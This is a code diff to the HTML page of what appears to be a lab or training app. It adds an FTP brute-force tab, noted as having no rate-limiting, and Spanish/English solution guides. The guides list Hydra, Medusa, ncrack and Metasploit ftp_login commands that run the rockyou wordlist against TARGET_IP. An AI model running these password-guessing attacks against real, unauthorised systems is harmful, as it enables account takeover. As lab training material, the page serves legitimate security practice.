@@ -15,6 +15,9 @@
     <button class="tab-pill" onclick="switchTab('smb', this)">
       <i class="ph ph-network text-sm"></i> SMB
     </button>
+    <button class="tab-pill" onclick="switchTab('ftp', this)">
+      <i class="ph ph-arrow-up-right text-sm"></i> FTP
+    </button>
   </div>
 
   <!-- ── HTTP Login Tab ── -->
@@ -92,6 +95,25 @@
       </div>
     </div>
   </div>
+
+  <!-- ── FTP Tab ── -->
+  <div id="tab-ftp" class="tab-pane">
+    <div class="hl-card mb-4">
+      <p class="text-sm text-gray-400 mb-4" data-i18n="bf_ftp_desc">
+        Ataque de fuerza bruta contra el servicio FTP de la máquina objetivo (puerto 21). No hay rate-limiting activo.
+      </p>
+      <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_host_ip">Host / IP</label>
+          <input type="text" id="ftp-host" placeholder="TARGET_IP" class="hl-input font-mono" />
+        </div>
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_username">Usuario</label>
+          <input type="text" id="ftp-user" value="admin" class="hl-input font-mono" />
+        </div>
+      </div>
+    </div>
+  </div>
 </div>
 
 <div id="resolution-data" class="hidden">
@@ -132,6 +154,16 @@ set RHOSTS TARGET_IP
 set SMBUser Administrator
 set PASS_FILE /usr/share/wordlists/rockyou.txt
 run</code></pre>
+    <h4>FTP — Hydra / Medusa / ncrack</h4>
+    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
+medusa -h TARGET_IP -u admin -P rockyou.txt -M ftp
+ncrack -p 21 --user admin -P rockyou.txt TARGET_IP</code></pre>
+    <h4>FTP — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/ftp/ftp_login
+set RHOSTS TARGET_IP
+set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run</code></pre>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Usage Guide</h3>
@@ -168,6 +200,16 @@ crackmapexec smb TARGET_IP -u Administrator -p rockyou.txt</code></pre>
     <pre><code class="language-bash">use auxiliary/scanner/smb/smb_login
 set RHOSTS TARGET_IP
 set SMBUser Administrator
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run</code></pre>
+    <h4>FTP — Hydra / Medusa / ncrack</h4>
+    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
+medusa -h TARGET_IP -u admin -P rockyou.txt -M ftp
+ncrack -p 21 --user admin -P rockyou.txt TARGET_IP</code></pre>
+    <h4>FTP — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/ftp/ftp_login
+set RHOSTS TARGET_IP
+set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 set PASS_FILE /usr/share/wordlists/rockyou.txt
 run</code></pre>
   </div>
